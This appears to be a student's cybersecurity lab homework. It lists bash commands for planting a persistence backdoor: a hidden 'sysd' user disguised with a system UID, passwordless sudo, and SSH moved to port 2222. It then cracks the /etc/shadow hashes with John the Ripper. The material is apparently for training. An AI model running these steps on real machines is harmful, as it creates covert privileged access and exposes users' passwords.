## Submission for Unit 6 Advanced Bash Homework

Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
- `sudo adduser --no-create-home sysd`

Give your secret user a password.
- `sudo passwd sysd`


Give your secret user a system UID < 1000.
- `sudo usermod -u 14 sysd`


Give your secret user the same GID
- `sudo groupmod -g 14 sysd`


Give your secret user full sudo access without the need for a password.
- `sudo usermod -a -G sudo sysd`
- `sudo visudo`

Test that sudo access works without your password

```bash
sudo -n true
```

## Allow ssh access over port 2222.

Command to edit the `sshd_config` file:

```bash
sudo nano /etc/ssh/sshd_config
change Port 22 to Port 2222
```

Command to restart the ssh service:
- `service sshd restart` 


Exit the root accout:
- `exit` 

SSH to the target machine using your `sysd` account and port 2222:
- `ssh sysd@192.168.6.105 -p 2222`


Use sudo to switch to the root user
- `sudo su -`
 
## Crack _all_ the passwords

Ssh back to the system using your sysd account
- `ssh sysd@192.168.6.105 -p 2222`


- Use John to crack the entire /etc/shadow file
    - `
    sudo apt install john
    cd /etc 
    /etc# sudo grep john shadow > shadow1.txt
    /etc# sudo john shadow1.txt 
    /etc# sudo john -show shadow1.txt
    `


